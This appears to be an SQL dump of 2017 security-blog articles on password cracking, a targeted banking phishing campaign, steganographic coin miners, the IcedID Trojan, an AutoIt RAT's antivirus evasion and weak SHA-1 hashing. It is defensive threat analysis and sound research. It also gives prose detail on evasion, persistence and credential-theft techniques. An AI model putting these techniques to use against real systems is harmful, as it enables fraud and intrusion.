levels of security. The best way for hotel guests to mitigate theft is to be aware of the risk and take the following   precautions: These tips can go a long way toward helping hotel guests stay safe and secure while traveling to visit loved ones during the holiday season. Remember to always be vigilant and wary of suspicious individuals, because they might just be digital pickpockets waiting to steal your valuables and holiday goodies when you least expect it.', '\'Access Management\', \'Hospitality Industry\', \'Hotel\', \'Near-Field Communication (NFC)\', \'Risk Management\', \'Travel Security\'', 'https://securityintelligence.com/traveling-this-holiday-season-beware-of-rfid-attacks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (56, 'The ‘Cracken’ in Action: A Password Cracking Adventure', 'David Bryan', '2017-11-27', 'The   team had a serious need for a powerful, dedicated password cracking system — something our whole global team could easily use. In my 10-year career as a penetration tester, I’ve learned that this is 100 percent necessary, since most of our projects are time-limited to a week or two. That means a pen tester might only have three to four days to crack a password before the project is over. An actual attacker has much more time.\n We started our password cracking adventures on a cloud computer. We needed to get something going that didn’t require months of lead time and would enable us to crack passwords for our projects. Our first machine only had four graphics processing units (GPUs). It worked, but it was pretty slow. Then along came an eight-GPU system in the cloud. This was better, but still not super awesome compared to some of the hash rates coming out of the regular video cards.\n When we started, our cloud password cracking habit only cost, at most, a few hundred dollars a month. By the time we had enough data to justify our rig, we were spending $2,500 to $3,000 per month on our limited 200- to 300-hour cracking runs.\n Lets do some quick math on these costs: A new, fully loaded system that would do what we needed retailed for about $22,000 to $24,000. If we kept paying $2,500 a month, that would end up costing us $30,000 a year, so we only ran jobs about 200 to 300 hours per month to keep costs down. To run jobs 24/7, we would be paying $105,000 a year for one system. We really needed two of them, so building our own system very quickly became a priority. That would save us $500,000 to $1 million over a five-year period.\n The hardware we used consisted of the components listed below.\n We ordered our password cracking hardware in February 2017. Had the GTX Ti cards been released by the time we finalized our order, we would have gone with those cards, since they deliver a significant bump in hash rates over the plain GTX 1080. Our next rig will most likely use them.\n We can easily justify the cost of this cracking rig just based on monthly costs. However, it’s worth breaking down   rates.\n Building our own hardware gives us so much more horsepower. Keep in mind that these numbers are only from one node. When we built the Cracken, we built two nodes, meaning we have a total of 16 GPUs that we can toss crack jobs at. Based on those numbers, the GTX 1080 cards are significantly faster at cracking hashes at a fraction of the cost.\n A few years ago, on another cracking cluster, I replaced the thermal grease on a batch of ATI 390Xs, and that actually helped reduce the temperature of the cards. We had been hitting the high end of the thermal shutdown quite often during our runs. One card failure would take out the entire PCI bus and server. To get the system back online, it required a physical power down of the system. After installing new thermal grease on the ATI cards, it dropped the cards’ high-end temperatures by at least 4 degrees Celsius, keeping them from hitting their thermal shutdown point.\n Before installing our Nvidia GTX 1080 FE cards, I had the bright idea of swapping out thermal grease on one of the cards. I did a tear down, cleaned off the factory thermal paste and put on my own super high-end paste. I’m a rebel, so I voided the warranty on one of our 16 cards. Did this help? Not enough to justify the time it takes. It seems that the GTX 1080 cards have good thermal grease, and the fan on the Founders Edition does the job to move heat away from the cards out of the box. It also doesn’t hurt that the external cases have three very large fans to move air. With the Nvidia GTX 1080 cards, thermal shutdown hasn’t been an issue. But with these cards, it really is much more about having proper airflow and strong, reliable power supplies. We have them in an external GPU case so we can prevent these cards from crashing and taking the whole cluster with it.\n To summarize the key lessons I learned during this experience:\n In our third and final installment in this series, we will talk about some tips and tricks to get the most out of Hashcat and some fun things we have done with it.\n In the meantime, follow us on Twitter:  ,  ,   and listen to our recent  .', '\'IBM Security\', \'Password\', \'Password Management\', \'Password Protection\', \'Penetration Testing\', \'X-Force\'', 'https://securityintelligence.com/the-cracken-in-action-a-password-cracking-adventure/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (57, 'Cybersecurity Tips to Help Retailers and Consumers Stay Secure During the Holiday Season', 'Nick Bradley', '2017-11-22', 'It’s time to take advantage of all those holiday specials and spend all your hard-earned bitcoin — er, I mean money — buying gifts for friends, family and, of course, yourself. Many retailers, large and small, online and brick-and-mortar, run holiday promotions as  . Gone are the days of waiting until Black Friday or Cyber Monday to take advantage of sales and specials. The bad guys will be shopping, too — just not for the same items you are. Instead, they will be shopping for your wallet. It’s true that some cyber Grinches ramp up their   during the holiday season, perhaps in the form of holiday-specific spam, spear phishing or compromised sites. While increased vigilance is encouraged during this time, there are a number of cybersecurity tips and best practices consumers and retailers should follow throughout the year to help mitigate threats. Having the right controls and awareness in place before the holidays can go a long way during the busy shopping season. \n Black Friday and Cyber Monday are heavy shopping days and are likely to remain so for the foreseeable future. However,   research conducted over the past few years revealed that there was   in network attacks targeting X-Force-monitored retailers during the traditional holiday shopping period in late November. In fact, last year, the volume of attacks for those two days fell below the daily attack average for retailers. \n \n However, now that the shopping extravaganza lasts for two or more months, it’s possible that this four-day window is too short of a time period to identify notable network attack trends. So far in 2017, network attacks targeting retail networks were highest in Q2, with June being the most-targeted month. Attacks dropped notably beginning in August and have been steadily declining, with the volume of attacks monitored for October below the monthly average for the year. \n \n Time to celebrate? Not necessarily. In 2016, we observed a notable surge in the volume of attacks targeting retailers in mid to late December. Additionally, malware compromises occurring earlier in the year that have gone undetected can wreak havoc once the busy season commences. In December 2016, a security researcher discovered that nearly 7,000 online stores running Magento shopping cart software were infected with   capable of logging credit cards and passwords and making them available to attackers as image files for exfiltration. Furthermore, bad actors do not have to steal anything to wreak havoc on the retail industry. A distributed denial-of-service (DDoS) attack is enough to cost the sector millions. In fact, the average cost of DDoS attack for organizations across all industries rose to   in 2016. Retailers are encouraged to   with increased vigilance during this holiday season. Vulnerable point-of-sale (POS) systems, compromised websites, and   can be costly. To help keep your security posture strong over this holiday shopping season and all year long, review and implement the recommendations outlined in the IBM report, “ .” Many online consumers have improved their security awareness as media coverage and education opportunities have increased. However, below are a few cybersecurity tips that many consumers likely haven’t thought of. Our digital interactions leave data trails. Finding the right balance between personalization and privacy is the consumer’s responsibility, not just the retailer’s. Many sites have the option to save your card data for future use. While this feature offers convenience to the consumer, the stored data can be stolen via SQL injection attacks or other database compromises — after all, there are   due to misconfigured servers. Always look for the green lock icon in the browser address bar to ensure a secure connection to websites. Criminals have gotten really good at devising phishing lures that are extremely difficult to recognize as fraudulent. Receive an attachment from someone that appears to be in your contact list? Call them to confirm. Order something online? Before clicking the “track package” link in the confirmation email, ensure that it is actually an item you purchased from the correct vendor. Exercise strong password hygiene by choosing to use a long, easy-to-remember passphrase, such as “ipreferpassphrasesoverpasswords,” instead of complex passwords containing a combination of letters, numbers and special characters. Unfortunately, this is not always an option since many websites now require a password that contains this combination. Use different passphrases for each site. If this seems too daunting, use a password manager. Rather than managing dozens of passphrases on your own, you’ll just have to remember the one key to your digital vault. Always opt for multifactor authentication when available, and figure out which option is the most secure when choosing a real-time short message service (SMS) text message, an email message or an automated phone call. When setting up new accounts, opt for security and password reset questions that aren’t public to make it harder for fraudsters to get their hands on your information. For example, don’t use your mother’s maiden name, which could be easily found online. Even answers to opinion-based questions, such as favorite movie, food, etc., can be  . For increased security, lie about your answers or use passphrases as the answers. By now, you have most likely heard of skimmers being placed on the card readers at gas stations and bank ATMs. A skimmer is a hidden device placed inside the mouth of a payment card reader that is designed to copy your card data for criminals to user later. But what about in-store POS systems? Be on the lookout for   card swiping terminals that could be skimmers, or cash register attendants who seem to swipe your card on two different readers. Maintain this vigilance not only during the holiday season, but all the time, especially if you travel to other countries. Banks and credit card companies have implemented some great security features, such as being able to set limits on the number of times the card can be used within an hour or on the amount that can be spent on one purchase. However, if you’re unaware of these limits for your personal accounts or your phone number is not up to date in your bank profile, you may end up with a declined card. Is the person in line behind you taking a selfie, or is he or she taking a picture of your card as you make a purchase? By obtaining the credit card number, name, expiration date and the card security code or card verification value on the back, an attacker may be able to use the information to make online purchases. The holiday season is a great time to take stock of the past year while relaxing and spending time with loved ones, but it’s no time to let your guard down, especially given the increasing sophistication of cybercriminal tactics targeting holiday shoppers and sellers alike. We encourage retailers and consumers to follow best practices not only this holiday season, but also all year long to help mitigate attacks and compromise.', '\'Multifactor Authentication (MFA)\', \'Password\', \'Password Management\', \'Password Protection\', \'Point-of-Sale (POS) Systems\', \'Retail\', \'Retail Industry\', \'Retail Security\'', 'https://securityintelligence.com/cybersecurity-tips-to-help-retailers-and-consumers-stay-secure-during-the-holiday-season/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (58, 'Canadian Business Banking Customers Hit With Targeted Phishing, Account Takeover Attacks', 'Limor Kessem', '2017-11-22', 'IBM X-Force research has been following the activity of a cybergang that has been targeting Canadian businesses with customized phishing attacks, likely operating out of Ukraine. The attacks are designed to trick those with account access to divulge their company’s online banking credentials, one-time passwords and two-factor authentication codes. The goal of this targeted phishing attack is to take the account over and transfer money to mule accounts that the criminals control. The first step in the attacks is an email. Much like other targeted attacks, this was a spear phishing email that was sent to very specific stakeholders with content made to appear legitimate, featuring the correct bank logos and accurate information. Inside that email, the storyline that was designed to gain the victim’s trust came in PDF format. This enabled the threat actors to hide the URL links, keywords and brand abuse from detection mechanisms that would pick these elements up had they been included in the body of the email. It also enabled them to ensnare users who possess enough security awareness to avoid clicking suspicious links in email messages. To set up for the email campaign, the attackers registered a few domains and created email addresses that contained the bank’s name and appeared to represent the bank’s customer service, security or technology departments. The group behind this targeted   took its time to craft customized PDF lures that appeared to come from actual employees of the victim’s bank. The attackers may have had prior knowledge about the targeted business’ account from a more widespread campaign or from another source. To actually take over the account, however, they needed token codes, and they needed them in real time. \n Upon opening the email, recipients encountered the attacker’s ploy: asking victims to synchronize their devices. This one was not especially ingenious — in fact, it is used often in many phishing and  . That fake synchronization is designed to include the process of generating one-time passwords with hardware tokens typically issued to business banking customers. The attackers also leveraged the urgency factor, another common hallmark of phishing attacks, by warning victims that they must open the PDF promptly for instructions to prevent canceled payments and transaction delays. \n \n Inside the PDF, the recipients saw properly branded content made to look like it came from one of the bank’s employees. In some cases, these documents contained valid employee names and titles. Others mixed the names and photos of different people. The PDF continued the ploy to pressure victims into undergoing the fake synchronization process, advising them that the device cannot be used until the process is complete. The PDF contained embedded links that redirected victims to phishing pages the attackers set up in advance. This page also resembled that of a legitimate bank. X-Force researchers noted that the content of the PDF changed slightly in some cases to address a specific victim’s role, another indication that the attackers had prior knowledge of their selected recipients. Some cases addressed a business banking user, for example, while others addressed an administrator with service access and additional users. If victims clicked the embedded link inside the PDF, they were first directed to an initial URL that simply bounced them off to the next one. The second hop is where the phishing attack was actually hosted, presenting victims with the stages of the fake process to synchronize their token devices. The attack was facilitated by a simple fake webpage on which victims were led to submit token codes. The codes went directly to the attackers in real time, allowing them to initiate a fraudulent transfer from an endpoint they controlled. A schematic flow of events appears below: Having analyzed the domains that served up these targeted attacks, X-Force researchers noted that they hosted a number of other attacks that also targeted Canadian banks. The domains’ IP address came from Ukraine’s IP range, most of which are registered with the .xyz top-level domain (TLD). Past   from IBM X-Force found that .xyz domain names are typically very cheap to register and can be sold for as little as pennies each, making them more lucrative to attackers that register multiple domains for malicious purposes. The identified IP address,  , was served via a local internet service provider (ISP) in Ukraine under the autonomous system AS58271. \n \n The initial bounce page victims arrived at was the domain www6com.xyz. From there, they were sent to a designated attack page that matched the bank’s brand. Each attack featured a few pages that moved the victims through the steps of the fake process to sync their token devices, starting with a login, then “sync,” “verify” (likely to get a second code), confirmation and end page. Continuing the analysis of attacks hosted on the same infrastructure, X-Force researchers discovered that the same group also has a more generic format for Canadian consumer accounts. The generic attacks featured a different ploy. This time, victims were supposedly going to receive a refund that could only be deposited directly into their bank account. They were directed to a main page that prompted them to select their banking institution before redirecting them to the corresponding attack page. \n Once on the next page, a succession of phishing pages requested the victim’s login details. It then asked for account security elements typically used for password resets, personally identifiable information (PII) and, finally, a note that the refund transfer could not be completed or that it had expired. \n \n \n These generic attacks were most likely sent in larger quantities to recipients in Canada without any specification of which bank each recipient uses. Older versions of the page simply indicated “Refund,” but the more recent ones name a telecommunications provider as the supposed issuer of the refund. The domains created for the generic attacks were initially registered individually. After about a month, however, the attackers moved on to using a domain generation algorithm (DGA) to create subdomains. This was likely implemented to widen the campaigns, automate the need to recycle ones that are discovered and taken down, and dedicate resources to each targeted brand. The setup of the phishing infrastructure highlights the operators’ access to cybercrime know-how. Cybercriminals’ focus on business banking services is an ongoing trend that became increasingly evident in 2014 with the emergence of financial crime groups that operated Trojans such as Dyre, Dridex and Neverquest. In many of these cases, the attackers are either situated in or otherwise linked to Eastern Europe, hosting malware and phishing operations from countries in the region. This trend has only been increasing, with malware such as  ,   and   showing that their focus is primarily on business banking and high-value accounts rather than consumer accounts. It is therefore not surprising to see financially motivated targeted attacks emerge from the same part of the world, delivering sophistication and familiarity to rob businesses in the West. X-Force research noted that, overall, the Russian-speaking underground and fraud economy has always been the most advanced in technical terms. That environment produces financially motivated actors with the skills and savvy to create advanced attack tools and enjoy support from fraud commodity and service vendors. It stands to reason that, due to the already developed network of cybercrime activity and tools in the region, groups that operate in that fraud arena use information sharing and various criminal-operated services designed for their chosen endeavors. The   in the workplace is an ongoing  . One of the most effective ways to detect spear phishing is role-based security training for employees, especially those with access to company resources such as bank accounts. During the investigation of these targeted attacks, the X-Force team noted that, in many cases, the victims were small and midsized businesses (SMBs). According to a recent  , 58 percent of large companies reported that they offer security training to employees, but only 30 percent of smaller companies do, which potentially exposes SMBs to greater risk of compromise, since their security budgets may be limited to begin with. Security training and   planning can go a long way toward helping to protect the business and recovering stolen funds in case of this type of compromise. Banks and businesses that wish to take a technological approach to detecting account takeover and protecting against phishing are invited to learn more about the  . To view a list of domains, IP addresses and currently live attacks, check out the public collection on  .', '\'Fraud\', \'Fraud Detection\', \'Fraud Prevention\', \'Fraud Protection\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Phishing\', \'Phishing Attack\', \'Phishing Emails\', \'Spear Phishing\'', 'https://securityintelligence.com/canadian-business-banking-customers-hit-with-targeted-phishing-account-takeover-attacks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (59, 'Steganography: A Safe Haven for Malware', 'Dave McMillen', '2017-11-16', 'Steganography, or the practice of concealing a file, message, image or video within another file, message, image or video, may be an older technique, but it continues to be an incredibly versatile and effective method for obscuring or hiding information in plain sight. In 2017, IBM X-Force has identified three different malware samples in network attacks containing cryptocurrency CPU-mining tools hidden within fake image files. In September 2017, IBM X-Force reported a   in these types of attacks. The X-Force team identified the use of steganography to hide embedded mining tools via command injection (CMDi) attacks detected by IBM Security’s managed intrusion detection and prevention system (IDPS) service. Cybercriminals continue to use steganography, likely because it is easy to convince users to open images without prompting suspicion. Below is an analysis of the most prevalent of the three malware samples used in the attacks. Although only one sample is analyzed here, the others resemble it in the way they work. We have included   for all three samples nonetheless. The most prevalent malware sample in the attack examples analyzed by X-Force uses steganography to hide a malicious image file called  . The following URL path is the value detected by the IBM X-Force command injection rule: Attackers often abuse legitimate services, such as free image hosting services that allow users to post images to different platforms. This can allow the attacker to spread malware from a variety of legitimate sources to multiple users. The file fantasy-938617.jpg in the URL above is the fake image and the string  that follows it is an instruction for the targeted endpoint/server to convert and execute the malicious code as shell code. The targeted system in this case is the JBoss application server as identified by the URL path  . The JavaScript file jexws4.jsp is not native to JBoss software — it’s actually a component of the JexBoss exploit tool. JexBoss is a tool for testing and exploiting Java deserialization vulnerabilities in JBoss application servers. If JexBoss is resident on the target machine, it would indicate that the server is compromised and will allow shell commands to be executed. In this case, the attacker mostly likely scanned for JBoss application servers that had already been compromised and then conducted a CMDi attack. Now, let’s break down the components of the string  : This is the image displayed to the victim: Below is a partial capture of the code behind the image: Below is the beginning of the script and where the skip points to begin execution. The code prior to this script is the .jpg image. The function DoMiner() represents the start of the code that executes a coin miner malware. After the malware is installed, the victim’s endpoint becomes a slave in a botnet that mines cryptocurrency for a cybercriminal. There are many older examples of cybercriminals using steganography to carry out their malicious deeds. The Stegoloader backdoor Trojan, for one, has been plaguing victims for  . In early 2015, the Vawtrak malware used steganography to  , which are small icon files associated with a particular website or webpage. The   campaign, launched in late December 2016, used steganography to hide malvertising, or malware in banner ads. More recently, IBM X-Force discovered a   involving a Neutrino bot dropping a payload that contained two Zeus malware breeds: Atmos and Zberp. The Zberp Trojan uses steganography to hide its configuration file. The delivery mechanism for all three malware samples analyzed was command injection, which was also the catalyst for their detection. However, as indicated earlier, steganography has been used with a variety of delivery methods, and detection of this technique can be tricky since it may not always be possible through network rules alone. For example, our CMDi rule detected the skip instructions in the samples analyzed; however, network rules wouldn’t detect the code behind the image. Attackers’ use of the steganography toolkit   demonstrates the additional need for behavioral analytics. An attacker can use the toolkit to embed malicious code within an image and perform a drive-by download attack to deliver the malware to the victim. To increase the detection capabilities of malware hiding via steganography, enterprises may want to invest in a   that can provide behavior-based analysis and work as part of an integrated security immune system. Integration with network protection and a   can help analysts keep track of what’s important when it comes to identifying evasive malware. Below are IoCs for each of the malware samples analyzed. Please access our   for additional information.', '\'Advanced Malware\', \'Cryptocurrency\', \'Cryptocurrency Miner\', \'IBM X-Force Research\', \'Malvertising\', \'Malware\', \'Stegoloader\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/steganography-a-safe-haven-for-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (60, 'New Banking Trojan IcedID Discovered by IBM X-Force Research', 'Limor Kessem', '2017-11-13', 'IBM X-Force research follows developments in the financial cybercrime arena to map the events and trends that shape the threat landscape for organizations and consumers alike. After a year that has been very active in terms of  ,   and rampant  , the X-Force team identified a new banking Trojan active in the wild dubbed IcedID. \n According to  , the new banking Trojan emerged in the wild in September 2017, when its first test campaigns were launched. Our researchers noted that IcedID has a modular malicious code with modern banking Trojan capabilities comparable to malware such as the Zeus Trojan. At this time, the malware targets banks, payment card providers, mobile services providers, payroll, webmail and e-commerce sites in the U.S. Two major banks in the U.K. are also on the target list the malware fetches. IcedID does not seem to have borrowed code from other Trojans, but it implements comparable features that allow it to perform advanced browser manipulation tactics. Although IcedID’s capabilities are already up to par with those of other banking Trojans such as Zeus, Gozi and Dridex, our researchers believe it will see further updates in the coming weeks. X-Force’s analysis of IcedID’s delivery method suggests that its operators are not new to the cybercrime arena, opting to infect users via the Emotet Trojan. X-Force research believes that a threat actor or a small cybergang has been operating Emotet as a distribution operation for banking Trojans and other malware codes this year. Emotet’s most prominent attack zone is the U.S. To a lesser extent, it also targets users in the U.K. and other parts of the world. Emotet has been one of the notable malware distribution methods in 2017, serving elite cybercrime groups from Eastern Europe, such as those operating   and  . It has now added IcedID as a new payload drop. Emotet emerged in 2014 after a leak of the original source code of the Bugat Trojan. It was originally a banking Trojan that preceded Dridex. As such, it is designed to amass and maintain botnets. Emotet persists on the machine and then fetches additional components such as a spamming module, a   module, and password and data stealers for Microsoft Outlook email and browser activity. Emotet itself comes  , usually inside rigged productivity files that contain  . Once Emotet infects the endpoint, it becomes a silent resident and is operated to serve malware from other cybercriminal groups. When it comes to tactics, techniques and procedures (TTPs), IcedID has a few tricks up its sleeve. Aside from the more common Trojan features, IcedID can propagate over a network. It monitors the victim’s online activity by setting up a local proxy for traffic tunneling, which is a concept reminiscent of the  . Its attack tactics include both webinjection attacks and sophisticated redirection attacks similar to the scheme used by Dridex and  . IcedID’s operators probably plan on targeting businesses because they added a network propagation module to the malware from the get-go. IcedID possesses the ability to move to other endpoints, and X-Force researchers also observed it infecting terminal servers. Terminal servers typically provide terminals, such as endpoints, printers and shared network devices, with a common connection point to a local area network (LAN) or a wide area network (WAN), which suggests that IcedID has already been targeting employee email to land on organizational endpoints. \n \n To find other users to infect, IcedID queries the lightweight directory access protocol (LDAP). \n \n IcedID’s financial fraud TTPs include two attack modes: webinjection attacks and redirection attacks. To begin, the malware downloads a configuration file from the Trojan’s command-and-control (C&C) server when the user opens the internet browser. The configuration includes targets for which a webinjection attack will be activated — mostly banks and other targets that were fitted with redirection attacks, such as payment cards and webmail sites. \n X-Force researchers ran a dynamic analysis on IcedID samples. At this time, the malware deploys on endpoints running various versions of the Windows operating system. It does not appear to possess any advanced anti-virtual machine (VM) or anti-research techniques, aside from the following: That being said, X-Force researchers assert that anti-forensic features could be added to this Trojan over time. IcedID is deployed to target endpoints using the Emotet Trojan as a dropper. After a reboot, the payload is written to the Windows %LocalAppData% folder with a value generated per some parameters from the operating system. That value is used both in the deployment path and the RunKey value for the file. The full convention for the value is: %LOCALAPPDATA%\\[a-z]{9}\\[a-z]{9}.exe. The malware sets its persistence mechanism by creating a RunKey in the registry to ensure its survival after system reboot events. Next, IcedID writes an RSA crypto key to the system into the AppData folder. The malware may write to this RSA key during the deployment routine, which could be linked to the fact that web traffic is tunneled through IcedID’s process even as it channels SSL traffic. X-Force is still investigating the exact use of the RSA key. The temp file is written according to the following convention: %TEMP%\\[A-F0-9]{8}.tmp. IcedID’s process continues to run, which is rather uncommon for malware. This could mean that some parts of the code are still being fixed and that this issue will change in the next update. The deployment process ends here and the dropper continues to run under the Explorer process until the next reboot of that endpoint. Upon the reboot event, the payload is executed and the IcedID Trojan becomes resident on the endpoint. At this point, the malware’s components are in place to begin redirecting the victim’s internet traffic through a local proxy that it controls. IcedID sets up a local proxy to listen and intercept communications from the victim’s endpoint and redirects all internet traffic through it in two hops. First, the traffic is transferred to the localhost (127.0.0.1) via port 49157, which is part of the dynamic/private TCP/IP ports. Second, the malware’s malicious process listens on that port and exfiltrates relevant communications to its C&C server. Although it has only recently been launched, IcedID already uses  . The redirection scheme IcedID uses is not a simple handover to another website with a different URL. Rather, it is designed to appear as seamless as possible to the victim. These tactics include displaying the legitimate bank’s URL in the address bar and the bank’s correct SSL certificate, which is made possible by keeping a live connection with the actual bank’s site. IcedID’s redirection scheme is implemented through its configuration file. The malware listens for the target URL from the list and, once it encounters a trigger, executes a designated webinjection. The webinjection sends the victim to a fake bank site set up in advance to match the one originally requested. The victim is fooled into submitting his or her credentials on the fake page replica, which unknowingly sends him or her to the attacker’s server. From that point on, the attacker controls the session the victim goes through, which typically includes   to trick the victim into divulging transaction authorization elements. IcedID’s communications take place over encrypted SSL. During a campaign analyzed in late October, the malware communicated with four different C&C servers. A schematic view of IcedID’s infection and communication infrastructure is shown below. \n To report new infections to the botnet, IcedID sends an encoded message with the bot ID and basic system information: \n Parts of the decoded message shows the following details being sent to the C&C: To orchestrate webinjection attacks for each targeted bank site, IcedID’s operators have a dedicated, web-based remote panel accessible with a username and password combination. Webinjection panels are typically commercial offerings criminals buy in underground markets. It is possible that IcedID’s uses a commercial panel or that IcedID itself is commercial malware. However, at this time there is no indication that IcedID is being sold in the underground or  . \n \n The panel communicates back to a server based on the   web platform. According to its official website, OpenResty is designed to help developers easily build scalable web applications, web services and dynamic web gateways. IcedID is a newly identified threat in the financial cybercrime arena. While it is still early to tell how it will fare, its current capabilities, distribution choices and targets point to a group that is no stranger to this domain. IBM X-Force research continues to follow and post updates on IcedID on  . To learn more about mitigating financial threats such as IcedID, please visit   products page. IBM X-Force analyzed the following dropper MD5s for this research. IBM X-Force analyzed the following hooks for this research. Internet Explorer: FireFox: Other hooks: For IP addresses and URLs from our investigation, please check reports in the  .', '\'Banking Malware\', \'Banking Security\', \'Banking Trojan\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Trojan\', \'Webinjection\', \'X-Force\'', 'https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (61, 'Overlay RAT Malware Uses AutoIt Scripting to Bypass Antivirus Detection', 'Gadi Ostrovsky', '2017-11-8', 'IBM X-Force Research follows the cybercrime arena across the globe to map the trends that shape online crime in each region. Brazil is a   for financial malware, where malicious developers create various malware types to target local users with identity theft and online banking fraud. In the past year, we have observed the rise of malware, such as   and similar codes, that uses remote access with overlay screens for bank fraud operations in Brazil. Recently, we detected a remote access Trojan (RAT) malware that uses the same overall technique, but with an added twist to its antivirus evasion method. \n Malware developers that target Brazilian banks are often concerned with evading antivirus (AV) software. To evade detection, they commonly attempt to   or find another workaround to avoid it. X-Force Research recently observed an overlay RAT malware using the AutoIt framework to bypass AV detection in attacks against Brazilian bank targets. The AutoIt framework is an open source tool. It’s a BASIC-like scripting language designed to automate functions in the Windows user interface as well as general scripting tasks. AutoIt runs on all versions of Windows. Within this context, the malware’s developer uses AutoIt to prevent static AV detection from recognizing the malware’s hash signature. To accomplish that, the malware’s developer compiled the malicious code with an AutoIt script and runs it as a valid AutoIt framework process where the malicious payload is loaded into an AutoIt process memory address space. \n \n \n After its decompilation, the script executes a certain flow of events: \n \n The decryption of the DLL runs first. The encryption selected by the malware’s developer is based on the Advanced Encryption Standard algorithm in  . It was implemented in AutoIt for use by this RAT malware. \n \n The DLL loading process happens in a few stages. The malware will use each stage to allocate memory space, protect it and then relocate it. To begin, the malware loads the DLL in an operation that it executes by calling the LoadLibraryEx application program interface (API) with DON’T_RESOLVE_DLL_REFERENCES, indicating that the Windows kernel should not load DLL dependencies. During this process, the operating system loads the DLL into memory and adjusts code sections without resolving imports. This simplifies the operation of copying sections later. To allocate memory space, the malware calls the VirtualAlloc API with a PAGE_READWRITE flag to enable read-only or read/write access to the committed region of pages. Additionally, memory allocation flags MEM_RESERVE and MEM_COMMIT are required to reserve virtual memory pages. Once memory has been reserved, the file’s contents can be copied to the system. At this point, the code section tasked with running the code must be allowed to execute it. To do this, the malware’s developer calls the VirtualProtect API with PAGE_EXECUTE_READWRITE rights. This API changes the protection on a region of committed pages in the virtual address space of the calling process, which means it can control whether an application is allowed to access the memory. In this case, the malware aims to hide its malicious code. Since all memory addresses in the code/data sections of a library are stored in locations relative to the base address defined by   in the  , a conflict arises if the library can’t be imported to a given memory address. This means the references must all be  . To modify the list accordingly, this malware uses the   function, followed by some defining parameters. \n \n The malware’s file further contains a list of functions it will need to import for each DLL. Because function addresses are not static, new location values are needed for each address. These can be deduced by loading all the DLLs that were not yet loaded into memory and mapping them into the process address space. To fix the import address table, the malware uses the FixImports function, as shows in the image below. \n \n To finalize loading the malware’s DLL into the virtual address space, the developer calls DllMain as an entry point. At the end of this routine, the malware releases the DLL that was loaded to memory during the first stage, calling the  . This frees the loaded DLL module and, if necessary, decrements its reference count, a step taken by the malware’s developer to wipe traces of the malicious code. To hide its internal strings, the malware uses a primitive asymmetric algorithm and a hardcoded key to decrypt it, which makes it easier for researchers to break once that key is located. \n \n The RAT code itself is written in Delphi, which is a programming language that has become synonymous with malicious codes written in Brazil. It is packed with an Ultimate Packer for Executables (UPX) obfuscator. After running the malware in our labs, we recreated the attack flow and discovered that it is yet another remote overlay malware designed to target online banking users in Brazil. X-Force Research does not see many classic banking Trojans operating in Brazil. If any such Trojans are operating in the region, they are entirely Zeus-based with a local twist, such as Zeus Panda. It’s worth noting that Zeus Panda has not been active in Brazil since it was  . Most cybercriminals attacking Brazilian banking customers stick with RATs. As long as those types of attacks continue to serve them, threat actors are unlikely to see a need for change. Overlay RAT malware has a typical flow of events on user endpoints. After its deployment, it monitors the user’s browser activity by checking the browser window’s title for bank names. If a targeted tab is found, the malware launches two elements: The malware’s operator remotely initiates a   from the victim’s endpoint and may prompt the user to provide additional details by using the fake overlay screen. This is only the latest of many similar codes that have long plagued Brazilian users. Like others of its kind, such as Malfies and Dybuk, one of this RAT’s goals is to evade antivirus detection and go unnoticed until the user is under its operator’s control. IBM X-Force analyzed the following samples for this research.', '\'Banking Malware\', \'Banking Trojan\', \'Brazil\', \'Financial Fraud\', \'Financial Malware\', \'IBM X-Force Research\', \'Malware\', \'Remote Access\', \'Remote-Access Trojan (RAT)\', \'Threat Intelligence\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/overlay-rat-malware-uses-autoit-scripting-to-bypass-antivirus-detection/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (62, 'How Not to Store Passwords: SHA-1 Fails Again', 'David Bryan', '2017-11-6', 'Problem: How do you store a password but make it nearly impossible to recover the plaintext in the event that the database with the password hash is compromised?\n When doing software development, it’s critical to review these functions. Having good development standards for your team will ensure that people store passwords properly and avoid mistakes that may cost you a lot of time or money later on.\n You could use symmetric key encryption to make a password unrecoverable, but all passwords will be exposed if the encryption key is ever discovered. Furthermore, you would still need to store the   someplace, and if attackers are on your systems, there’s a good chance they have the encryption key, too.\n Put simply, you should never use symmetric key encryption to store passwords. It’s a really bad idea.\n \n Is password hashing encryption? No. To ensure that you don’t make this mistake, it’s best to have the development process create strong standards.\n When reviewing code, I’ve seen all kinds of modules and source code refer to password hashing as encrypting the password. This is just not true. Hashing is a one-way function designed to always produce the same results when data is passed into it. Hashing can be a cryptographic function, but it does not encrypt the data. However, it can be a way to store passwords without retaining the original text.\n I recently worked on a project where I was able to gain access to a database that not only contained bcrypt hashes, but also SHA-1 hashes in the same row. Bcrypt is a solid way to protect password hashes because it takes a lot of power to brute-force them. Bcrypt uses salts by default and does multiple rounds using the password and a salt to get a hash result. Why do we need a salt, and what is it, anyway?\n Without a salt, fraudsters could quickly determine whether 300 or 3,000 users all had the same password in a data set, since the resulting hashes in the database would be exactly the same. So let’s talk about SHA-1 a bit. While it is fast,   and should not be used. The managers of the aforementioned project stored unsalted SHA-1 hashes in the same database as the bcrypt hashes. This means the SHA-1 hashes were much easier to crack and brute-force.\n Using a   with four graphics processing units (GPUs), I was able to recover about 700,000 of the 1.2 million accounts involved in my project in about 12 hours. Because there wasn’t any salting on the hashes stored in the database, that fact that we recovered one account and password meant that we could likely recover passwords for many of the other accounts at the exact same time.\n Of the 1.2 million accounts, I saw thousands of users that all had the exact same hash and thus the same password. I made a top 1,000 list of this data set, and even at the bottom of this list, there were still 38 accounts that all used the same password.\n Of the top 